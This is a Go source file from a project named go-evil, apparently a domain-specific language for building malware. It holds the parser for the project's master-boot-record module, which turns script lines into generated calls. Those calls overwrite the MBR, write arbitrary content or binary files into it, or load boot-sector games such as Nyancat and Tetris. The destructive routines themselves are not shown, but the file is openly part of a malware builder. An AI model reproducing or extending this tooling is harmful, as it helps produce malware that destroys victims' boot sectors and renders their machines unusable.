package mbr

import (
	"fmt"
	"regexp"

	"github.com/s9rA16Bf4/go-evil/utility/contains"
	"github.com/s9rA16Bf4/go-evil/utility/error"
	"github.com/s9rA16Bf4/go-evil/utility/json"
)

const (
	EXTRACT_SUBDOMAIN = "(mbr)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
	EXTRACT_FUNCTION  = "(mbr)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
)

func Parse(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("MBR.Parse()")

	for _, line := range data_structure.File_gut {
		value := contains.Passed_value(line)

		regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
		result := regex.FindAllStringSubmatch(line, -1)
		if len(result) > 0 { // There is a subdomain to extract
			subdomain := result[0][2]
			function := result[0][3]

			switch subdomain {
			case "load":
				switch function {
				case "game_of_life":
					data_structure.Append_malware_gut("mbr.Load_Game_of_life()")
				case "nyancat":
					data_structure.Append_malware_gut("mbr.Load_Nyancat()")
				case "snake":
					data_structure.Append_malware_gut("mbr.Load_Snake()")
				case "tetris":
					data_structure.Append_malware_gut("mbr.Load_Tetris()")
				case "content":
					data_structure.Append_malware_gut(fmt.Sprintf("mbr.Load_content(\"%s\")", value))
				case "binary":
					data_structure.Append_malware_gut(fmt.Sprintf("mbr.Load_binary_file(\"%s\")", value))

				default:
					error.Function_error(function, "mbr.Parse()")
				}

			default:
				error.Subdomain_error(subdomain, "mbr.Parse()")
			}
		} else { // There might be a function which doesn't require a subdomain to work
			regex = regexp.MustCompile(EXTRACT_FUNCTION)
			result = regex.FindAllStringSubmatch(line, -1)
			if len(result) > 0 {
				function := result[0][2]
				switch function {
				case "overwrite":
					data_structure.Append_malware_gut("mbr.Overwrite()")
				default:
					error.Function_error(function, "mbr.Parse()")
				}
			}
		}
	}

	return json.Send(data_structure)
}
